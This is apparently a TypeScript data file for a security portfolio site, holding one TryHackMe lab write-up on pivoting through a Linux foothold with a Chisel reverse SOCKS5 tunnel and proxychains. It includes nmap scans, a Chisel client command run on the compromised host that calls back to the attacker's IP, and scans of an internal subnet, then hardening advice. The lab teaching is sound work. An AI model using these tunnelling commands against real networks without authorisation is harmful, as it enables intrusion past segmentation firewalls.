export interface Writeup {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  readTime: string;
  platformTag: "TryHackMe" | "BlockSec" | "Bug Bounty" | string;
  tags: string[];
  contentHtml: string;
}

export const writeups: Writeup[] = [
  {
    slug: "network-pivoting-chisel-socks5",
    title: "Network Pivoting & Chisel SOCKS5 Routing",
    excerpt: "Step-by-step routing of internal subnet traffic via reverse port forwarding and Chisel proxying into a segmented subnet.",
    date: "Oct 2026",
    readTime: "8 min",
    platformTag: "TryHackMe",
    tags: ["Network", "Pivoting", "Chisel", "Linux"],
    contentHtml: `
      <h2>1. Overview & Objectives</h2>
      <p>During a network penetration assessment, direct access to the internal database tier is frequently blocked by boundary firewalls. This lab demonstrates establishing a resilient reverse SOCKS5 tunnel through an initial Linux foothold using <code>chisel</code>.</p>
      
      <h2>2. Initial Footprint & Enumeration</h2>
      <p>A standard SYN scan on the dual-homed machine reveals an exposed HTTP service alongside an internal secondary interface (<code>10.10.20.0/24</code>):</p>
      <pre><code>nmap -sC -sV -p- 10.10.10.50</code></pre>
      
      <h2>3. Establishing the Chisel Reverse Tunnel</h2>
      <p>On the attacking machine, start the Chisel server in reverse mode:</p>
      <pre><code>chisel server -p 8000 --reverse</code></pre>
      
      <p>On the compromised target machine, launch the client and request a reverse SOCKS5 proxy:</p>
      <pre><code>./chisel client 10.10.14.15:8000 R:socks</code></pre>

      <h2>4. Pivoting Through Proxychains</h2>
      <p>Configure <code>/etc/proxychains4.conf</code> with <code>socks5 127.0.0.1 1080</code> to route discovery scans into the hidden subnet:</p>
      <pre><code>proxychains nmap -sT -Pn -p 22,80,3306 10.10.20.5</code></pre>

      <h2>5. Remediation & Hardening</h2>
      <ul>
        <li>Implement strict egress firewall rules preventing non-standard outbound TCP connections.</li>
        <li>Deploy host-based endpoint detection to identify unauthorized binary executions in <code>/tmp</code>.</li>
        <li>Segment management interfaces using dedicated jump-boxes with mandatory MFA.</li>
      </ul>
    `,
  },
];
